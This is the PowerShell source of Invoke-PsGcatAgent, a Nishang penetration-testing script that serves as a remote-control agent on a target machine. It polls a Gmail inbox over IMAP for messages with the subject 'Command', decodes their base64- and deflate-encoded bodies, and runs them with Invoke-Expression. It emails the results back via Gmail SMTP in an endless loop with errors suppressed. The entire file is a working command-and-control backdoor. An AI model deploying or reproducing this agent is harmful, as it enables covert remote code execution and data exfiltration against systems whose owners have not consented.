function Invoke-PsGcatAgent
{
<#
.SYNOPSIS
Nishang script which can be used to execute commands and scripts from Gmail uploaded by Invoke-PSGcat.

.DESCRIPTION
This script is capable of executing commands and/or scripts from Gmail and send the output back. 
A valid Gmail username and password is required.
This script must be executed on the target and commands should be uploaded by Invoke-PsGcat on attacker's machine.

In the Gmail security settings of that account "Access for less secure apps" must be turned on. Make sure that you use
a throw away account.

Script execution is not very reliable right now and you may see the agent struggling to pull a big encoded script.

.PARAMETER Username
Username of the Gmail account you want to use. 

.PARAMETER Password
Password of the Gmail account you want to use. 

.PARAMETER AgentID
AgentID is currently unused and would be used with multiple agent support in future. 

.PARAMETER Delay
Delay in seconds after a successful execution. Default is 60.

.EXAMPLE
PS > Invoke-PSGcatAgent -Username psgcatlite -password pspassword -Delay 10
Pull latest command/script from Gmail and execute with a delay of 10 seconds.

.LINK
http://www.labofapenetrationtester.com/2015/04/pillage-the-village-powershell-version.html
https://github.com/samratashok/nishang
#>

    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $false)]
        [String]
        $Username,

        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $Password,

        [Parameter(Position = 2, Mandatory = $false)]
        [String]
        $AgentID,

        [Parameter(Position = 3, Mandatory = $false)]
        [String]
        $Delay = 60
    )
    
    
    $ErrorActionPreference = "SilentlyContinue"
                
    while ($true)
    {
        try 
        {

            #Basic IMAP interaction from http://learningpcs.blogspot.in/2012/01/powershell-v2-read-gmail-more-proof-of.html
            $tcpClient = New-Object -TypeName System.Net.Sockets.TcpClient

            # Connect to gmail
            $tcpClient.Connect("imap.gmail.com", 993)
            if($tcpClient.Connected) 
            {
                # Create new SSL Stream for tcpClient
                [System.Net.Security.SslStream] $sslStream = $tcpClient.GetStream()
                
                # Authenticating as client
                $sslStream.AuthenticateAsClient("imap.gmail.com");
                $script:result = ""
                $sb = New-Object System.Text.StringBuilder
                $mail =""
                $responsebuffer = [Array]::CreateInstance("byte", 2048)
                
                #Send IMAP commands and read response
                function ReadResponse ($command, $ReturnResult)
                {
                    $sb = New-Object System.Text.StringBuilder
                    if ($command -ne "")
                    {
                        $command
                        $buf = [System.Text.Encoding]::ASCII.GetBytes($command)
                        $sslStream.Write($buf, 0, $buf.Length)
                    }
                    $sslStream.Flush()
                    $bytes = $sslStream.Read($responsebuffer, 0, 2048)
                    $str = $sb.Append([System.Text.Encoding]::ASCII.GetString($responsebuffer))
                    $sb.ToString()
                    
                    #Select the output of SEARCH IMAP command
                    $temp = $sb.ToString() | Select-String "\* SEARCH"
                    if ($temp)
                    {
                        $fetch = $temp.ToString() -split "\$",2
                        $tmp = $fetch[0] -split "\* SEARCH " -split " " -replace "`n"
                        [int]$mail = $tmp[-1]
                        
                        #FETCH the body of the last email which matches the SEARCH criteria
                        $cmd = ReadResponse("$ FETCH $mail BODY[TEXT]`r`n", "1")
                        $tmp = $cmd[2] -split "\)",2 -replace "`n" 
                        $TempCommand = ($tmp[0] -split "##",2)[1] -replace "(?<=\=)3D" -replace "`r"
                        $EncCommand = $TempCommand -replace '(?!={1,2}$)=','' -replace "`r"
                        Write-Verbose "Executing Encoded Command $EncCommand"
                        #Decode
                        $dec = [System.Convert]::FromBase64String($EncCommand)
                        $ms = New-Object System.IO.MemoryStream
                        $ms.Write($dec, 0, $dec.Length)
                        $ms.Seek(0,0) | Out-Null
                        $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
                        $sr = New-Object System.IO.StreamReader($cs)
                        $cmd = $sr.readtoend()
                        $result = Invoke-Expression $cmd -ErrorAction SilentlyContinue

                        #Send results to gmail
                        #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
                        $smtpserver = "smtp.gmail.com"
                        $msg = new-object Net.Mail.MailMessage
                        $smtp = new-object Net.Mail.SmtpClient($smtpServer )
                        $smtp.EnableSsl = $True
                        $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
                        $msg.From = "$username@gmail.com"
                        $msg.To.Add("$username@gmail.com")
                        $msg.Subject = "Output from $env:Computername"
                        $msg.Body = $result
                        $smtp.Send($msg)
                    }
                }

                #Interact with Gmail using IMAP
                ReadResponse ""
                ReadResponse ("$ LOGIN " + "$Username@gmail.com" + " " + "$Password" + "  `r`n") | Out-Null
                ReadResponse("$ SELECT INBOX`r`n") | Out-Null
                ReadResponse("$ SEARCH SUBJECT `"Command`"`r`n")
                ReadResponse("$ LOGOUT`r`n")  | Out-Null
                Start-Sleep -Seconds $Delay
                
            } 

            else 
            {
                Write-Error "You are not connected to the host. Quitting"
            }

        }
        catch 
        {
            $_
        }
    }
}       

